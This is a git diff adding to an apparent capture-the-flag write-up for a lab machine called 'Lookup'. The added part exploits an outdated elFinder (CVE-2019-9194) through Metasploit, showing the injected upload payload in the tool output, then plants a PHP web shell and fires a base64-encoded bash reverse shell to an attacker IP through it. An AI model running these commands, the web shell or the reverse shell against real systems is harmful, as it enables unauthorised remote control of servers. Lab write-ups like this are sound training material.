@@ -72,6 +72,7 @@ ERROR Opening: https://10.80.183.237 - Connection refused - connect(2) for "10.8
 http://10.80.183.237 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], RedirectLocation[http://lookup.thm]
 http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], PasswordField[password], Title[Login Page]
 ```
+Nothing intresting
 
 ## Brute-Force
 At website first thing we can so is login page soo we can try use it
@@ -148,4 +149,66 @@ We can see website redirect to **http://files.lookup.thm** so its good idea to *
 
 and like that we got it 
 <img width="2254" height="373" alt="image" src="https://github.com/user-attachments/assets/4e0cfb97-959b-4677-a946-24325cb71ce5" />
+
+We can se this is outdated librarie
+https://nvd.nist.gov/vuln/detail/CVE-2019-9194
+<img width="1365" height="437" alt="image" src="https://github.com/user-attachments/assets/5d3ef046-620d-4465-9ed8-50b7cee1fa07" />
+
+### Metasploit:
+```
+msfconsole
+search elfinder 2.1.47
+use 0
+show options
+set LHOST tun0
+set RHOST files.lookup.thm
+run
+```
+Output:
+```
+[*] Started reverse TCP handler on 192.168.138.9:4444 
+[*] Uploading payload '0EbmAbJQ.jpg;echo 6370202e2e2f66696c65732f3045626d41624a512e6a70672a6563686f2a202e33474c396c746d4c752e706870 |xxd -r -p |sh& #.jpg' (1959 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.3GL9ltmLu.php) ...
+[*] Sending stage (41224 bytes) to 10.80.133.47
+[+] Deleted .3GL9ltmLu.php
+[*] Meterpreter session 1 opened (192.168.138.9:4444 -> 10.80.133.47:52754) at 2025-11-25 20:56:48 +0000
+```
+Now we create RCE
+```
+[ Oguri ~/Desktop/CTF/Lookup ]$ echo '<?php system($_GET["cmd"]) ?>' > rce.php
+[ Oguri ~/Desktop/CTF/Lookup ]$ ls
+rce.php
+[ Oguri ~/Desktop/CTF/Lookup ]$ cat rce.php 
+<?php system($_GET["cmd"]) ?>
+```
+And upload to web
+```
+meterpreter > upload /home/caffra/Desktop/CTF/Lookup/rce.php
+[*] Uploading  : /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
+[*] Uploaded -1.00 B of 30.00 B (-3.33%): /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
+[*] Completed  : /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
+meterpreter > ls
+Listing: /var/www/files.lookup.thm/public_html
+==============================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040111/--x--x--x  4096  dir   2024-04-02 12:30:58 +0000  elFinder
+100644/rw-r--r--  706   fil   2024-01-11 20:20:18 +0000  index.php
+100644/rw-r--r--  30    fil   2025-11-25 21:14:59 +0000  rce.php
+```
+We can prepare "rev" at https://www.revshells.com/
+```
+[ Oguri ~/Desktop ]$ echo '/bin/bash -i >& /dev/tcp/192.168.138.9/9001 0>&1' | base64
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==
+```
+Set a Netcat
+```
+[ Oguri ~/Desktop/CTF/Lookup ]$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+```
+Use it at web like that:
+
+http://files.lookup.thm/rce.php?cmd=echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==' | base64 -d | bash
 
